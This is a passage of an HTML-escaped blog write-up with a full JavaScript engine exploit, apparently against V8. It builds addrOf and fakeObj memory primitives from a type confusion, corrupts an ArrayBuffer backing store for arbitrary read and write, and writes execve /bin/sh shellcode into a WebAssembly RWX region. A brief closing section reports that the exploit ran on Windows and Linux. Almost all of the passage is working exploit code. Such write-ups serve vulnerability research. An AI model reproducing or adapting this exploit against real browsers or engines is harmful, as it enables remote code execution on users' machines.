&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;makeObj&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;pValues&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; obj = {
        inline: &lt;span class=&#34;hljs-number&#34;&gt;1234&lt;/span&gt;
    };
    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt;; i++) {
        &lt;span class=&#34;hljs-built_in&#34;&gt;Object&lt;/span&gt;.defineProperty(obj, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;p&amp;apos;&lt;/span&gt; + i, {
            writable: &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;,
            value: pValues[i]
        });
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; obj;
}

&lt;span class=&#34;hljs-comment&#34;&gt;// Function to find overlapping properties&lt;/span&gt;
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; p1, p2;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;findOverlappingProperties&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; pNames = [];
    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt;; i++) {
        pNames[i] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;p&amp;apos;&lt;/span&gt; + i;
    }

    &lt;span class=&#34;hljs-built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;`&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;        function vuln(obj) {&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;            obj.inline;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;            this.Object.create(obj);&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;            &lt;span class=&#34;hljs-subst&#34;&gt;${pNames.map((p) =&amp;gt; &lt;span class=&#34;hljs-string&#34;&gt;`let &lt;span class=&#34;hljs-subst&#34;&gt;${p}&lt;/span&gt; = obj.&lt;span class=&#34;hljs-subst&#34;&gt;${p}&lt;/span&gt;;`&lt;/span&gt;).join(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;\n&amp;apos;&lt;/span&gt;)}&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;            return [&lt;span class=&#34;hljs-subst&#34;&gt;${pNames.join(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;, &amp;apos;&lt;/span&gt;)}&lt;/span&gt;];&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;        }&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;    `&lt;/span&gt;);

    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; pValues = [];
    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt;; i++) {
        pValues[i] = -i;
    }

    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;10000&lt;/span&gt;; i++) {
        &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; res = vuln(makeObj(pValues));
        &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;; i &amp;lt; res.length; i++) {
            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (i !== -res[i] &amp;amp;&amp;amp; res[i] &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; res[i] &amp;gt; &lt;span class=&#34;hljs-number&#34;&gt;-32&lt;/span&gt;) {
                [p1, p2] = [i, -res[i]];
                &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt;;
            }
        }
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[!] Failed to find overlapping properties&amp;quot;&lt;/span&gt;;
}

&lt;span class=&#34;hljs-comment&#34;&gt;// Return address of an object as a BigInt&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;addrOf&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;obj&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&#34;hljs-built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;`&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;        function vuln(obj) {&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;            obj.inline;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;            this.Object.create(obj);&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;            return obj.p&lt;span class=&#34;hljs-subst&#34;&gt;${p1}&lt;/span&gt;.x1;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;        }&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;    `&lt;/span&gt;);

    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; pValues = [];
    pValues[p1] = { &lt;span class=&#34;hljs-attr&#34;&gt;x1&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;13.37&lt;/span&gt;, &lt;span class=&#34;hljs-attr&#34;&gt;x2&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;13.38&lt;/span&gt; };
    pValues[p2] = { &lt;span class=&#34;hljs-attr&#34;&gt;y&lt;/span&gt;: obj };

    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;10000&lt;/span&gt;; i++) {
        &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; res = vuln(makeObj(pValues));
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (res != &lt;span class=&#34;hljs-number&#34;&gt;13.37&lt;/span&gt;) {
            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; res.toBigInt() - &lt;span class=&#34;hljs-number&#34;&gt;1n&lt;/span&gt;;
        }
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[!] AddrOf Primitive Failed&amp;quot;&lt;/span&gt;;
}

&lt;span class=&#34;hljs-comment&#34;&gt;// Function to write data to obj address&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;fakeObj&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;obj, newValue&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&#34;hljs-built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;`&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;        function vuln(obj) {&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;            obj.inline;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;            this.Object.create(obj);&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;            let orig = obj.p&lt;span class=&#34;hljs-subst&#34;&gt;${p1}&lt;/span&gt;.x2;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;            obj.p&lt;span class=&#34;hljs-subst&#34;&gt;${p1}&lt;/span&gt;.x2 = &lt;span class=&#34;hljs-subst&#34;&gt;${newValue.toNumber()}&lt;/span&gt;;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;            return orig;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;        }&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;    `&lt;/span&gt;);

    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; pValues = [];
    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; o = { &lt;span class=&#34;hljs-attr&#34;&gt;x1&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;13.37&lt;/span&gt;, &lt;span class=&#34;hljs-attr&#34;&gt;x2&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;13.38&lt;/span&gt; };
    pValues[p1] = o;
    pValues[p2] = obj;

    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;10000&lt;/span&gt;; i++) {
        o.x2 = &lt;span class=&#34;hljs-number&#34;&gt;13.38&lt;/span&gt;;
        &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; res = vuln(makeObj(pValues));
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (res != &lt;span class=&#34;hljs-number&#34;&gt;13.38&lt;/span&gt;) {
            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; res.toBigInt();
        }
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[!] fakeObj Primitive Failed&amp;quot;&lt;/span&gt;;
}

&lt;span class=&#34;hljs-comment&#34;&gt;// Find Overlapping Properties&lt;/span&gt;
print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Finding Overlapping Properties...&amp;quot;&lt;/span&gt;);
findOverlappingProperties();
print(&lt;span class=&#34;hljs-string&#34;&gt;`[+] Properties p&lt;span class=&#34;hljs-subst&#34;&gt;${p1}&lt;/span&gt; and p&lt;span class=&#34;hljs-subst&#34;&gt;${p2}&lt;/span&gt; overlap!`&lt;/span&gt;);

&lt;span class=&#34;hljs-comment&#34;&gt;// Create Array Buffers&lt;/span&gt;
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; arrBuf1 = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;ArrayBuffer&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;1024&lt;/span&gt;);
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; arrBuf2 = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;ArrayBuffer&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;1024&lt;/span&gt;);

&lt;span class=&#34;hljs-comment&#34;&gt;// Leak Address of arrBuf2&lt;/span&gt;
print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Leaking ArrayBuffer Address...&amp;quot;&lt;/span&gt;);
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; arrBuf2Addr = addrOf(arrBuf2);
print(&lt;span class=&#34;hljs-string&#34;&gt;`[+] ArrayBuffer Address @ 0x&lt;span class=&#34;hljs-subst&#34;&gt;${arrBuf2Addr.toString(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)}&lt;/span&gt;`&lt;/span&gt;);

&lt;span class=&#34;hljs-comment&#34;&gt;// Corrupt Backing Store Pointer of arrBuf1&lt;/span&gt;
print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Corrupting ArrayBuffer Backing Store...&amp;quot;&lt;/span&gt;);
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; originalArrBuf1BackingStore = fakeObj(arrBuf1, arrBuf2Addr);

&lt;span class=&#34;hljs-comment&#34;&gt;// Store Original Backing Store Pointer of arrBuf2&lt;/span&gt;
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; view1 = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; BigUint64Array(arrBuf1);
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; originalArrBuf2BackingStore = view1[&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;];

&lt;span class=&#34;hljs-comment&#34;&gt;// Memory Read and Write Primitives&lt;/span&gt;
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; memory = {
    write(addr, bytes) {
        view1[&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;] = addr;
        &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; view2 = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;Uint8Array&lt;/span&gt;(arrBuf2);
        view2.set(bytes);
    },
    read64(addr) {
        view1[&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;] = addr;
        &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; view2 = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; BigUint64Array(arrBuf2);
        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; view2[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;];
    },
    write64(addr, ptr) {
        view1[&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;] = addr;
        &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; view2 = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; BigUint64Array(arrBuf2);
        view2[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] = ptr;
    },
    addrOf(obj) {
        arrBuf2.leakMe = obj;
        &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; props = &lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;.read64(arrBuf2Addr + &lt;span class=&#34;hljs-number&#34;&gt;8n&lt;/span&gt;) - &lt;span class=&#34;hljs-number&#34;&gt;1n&lt;/span&gt;;
        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;.read64(props + &lt;span class=&#34;hljs-number&#34;&gt;16n&lt;/span&gt;) - &lt;span class=&#34;hljs-number&#34;&gt;1n&lt;/span&gt;;
    }
};

print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Constructed Memory Read and Write Primitive!&amp;quot;&lt;/span&gt;);

&lt;span class=&#34;hljs-comment&#34;&gt;// Generate RWX region via WASM&lt;/span&gt;
print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Generating a WebAssembly Instance...&amp;quot;&lt;/span&gt;);
&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; wasmCode = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;Uint8Array&lt;/span&gt;([&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;97&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;115&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;109&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;133&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;96&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;127&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;130&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;132&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;112&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;131&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;129&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;145&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;109&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;101&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;109&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;111&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;114&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;121&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;109&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;97&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;105&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;110&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;138&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;132&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;65&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;42&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;11&lt;/span&gt;]);
&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; wasmModule = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; WebAssembly.Module(wasmCode);
&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; wasmInstance = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; WebAssembly.Instance(wasmModule);
&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; func = wasmInstance.exports.main;

&lt;span class=&#34;hljs-comment&#34;&gt;// Leak WebAssembly Instance Address and Jump Table&lt;/span&gt;
print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Leaking WebAssembly Instance Address...&amp;quot;&lt;/span&gt;);
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; wasmInstanceAddr = memory.addrOf(wasmInstance);
print(&lt;span class=&#34;hljs-string&#34;&gt;`[+] WebAssembly Instance Address @ 0x&lt;span class=&#34;hljs-subst&#34;&gt;${wasmInstanceAddr.toString(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)}&lt;/span&gt;`&lt;/span&gt;);
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; wasmRWXAddr = memory.read64(wasmInstanceAddr + &lt;span class=&#34;hljs-number&#34;&gt;0xF0n&lt;/span&gt;);
print(&lt;span class=&#34;hljs-string&#34;&gt;`[+] WebAssembly RWX Jump Table Address @ 0x&lt;span class=&#34;hljs-subst&#34;&gt;${wasmRWXAddr.toString(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)}&lt;/span&gt;`&lt;/span&gt;);

print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Preparing Shellcode...&amp;quot;&lt;/span&gt;);
&lt;span class=&#34;hljs-comment&#34;&gt;// Linux x64 Shellcode to execute /bin/sh&lt;/span&gt;
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; shellcode = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;Uint8Array&lt;/span&gt;([
    &lt;span class=&#34;hljs-number&#34;&gt;0x6a&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x3b&lt;/span&gt;,                   &lt;span class=&#34;hljs-comment&#34;&gt;// push 59 (syscall number for execve)&lt;/span&gt;
    &lt;span class=&#34;hljs-number&#34;&gt;0x58&lt;/span&gt;,                         &lt;span class=&#34;hljs-comment&#34;&gt;// pop rax&lt;/span&gt;
    &lt;span class=&#34;hljs-number&#34;&gt;0x48&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x31&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xd2&lt;/span&gt;,            &lt;span class=&#34;hljs-comment&#34;&gt;// xor rdx, rdx (envp = NULL)&lt;/span&gt;
    &lt;span class=&#34;hljs-number&#34;&gt;0x48&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x31&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xf6&lt;/span&gt;,            &lt;span class=&#34;hljs-comment&#34;&gt;// xor rsi, rsi (argv = NULL)&lt;/span&gt;
    &lt;span class=&#34;hljs-number&#34;&gt;0x48&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xbf&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x2f&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x62&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x69&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x6e&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x2f&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x73&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x68&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x00&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;// movabs rdi, &amp;quot;/bin/sh\x00&amp;quot;&lt;/span&gt;
    &lt;span class=&#34;hljs-number&#34;&gt;0x57&lt;/span&gt;,                         &lt;span class=&#34;hljs-comment&#34;&gt;// push rdi&lt;/span&gt;
    &lt;span class=&#34;hljs-number&#34;&gt;0x48&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x89&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xe7&lt;/span&gt;,            &lt;span class=&#34;hljs-comment&#34;&gt;// mov rdi, rsp&lt;/span&gt;
    &lt;span class=&#34;hljs-number&#34;&gt;0x0f&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x05&lt;/span&gt;                    &lt;span class=&#34;hljs-comment&#34;&gt;// syscall&lt;/span&gt;
]);

print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Writing Shellcode to Jump Table Address...&amp;quot;&lt;/span&gt;);
&lt;span class=&#34;hljs-comment&#34;&gt;// Write Shellcode&lt;/span&gt;
memory.write(wasmRWXAddr, shellcode);

print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Spawning Shell...&amp;quot;&lt;/span&gt;);
&lt;span class=&#34;hljs-comment&#34;&gt;// Execute Shellcode&lt;/span&gt;
func();
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;Result&#34;&gt;&lt;a href=&#34;#Result&#34; class=&#34;headerlink&#34; title=&#34;Result&#34;&gt;&lt;/a&gt;Result&lt;/h3&gt;&lt;p&gt;Because this exploit writes shellcode into a wasm instance&amp;#x2019;s jump table in memory, porting the payload to Linux involved only changing the shellcode. I replaced the calc payload with a shell spawner and ran it successfully on Linux.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Windows&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;image%203.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Linux&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;image%204.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
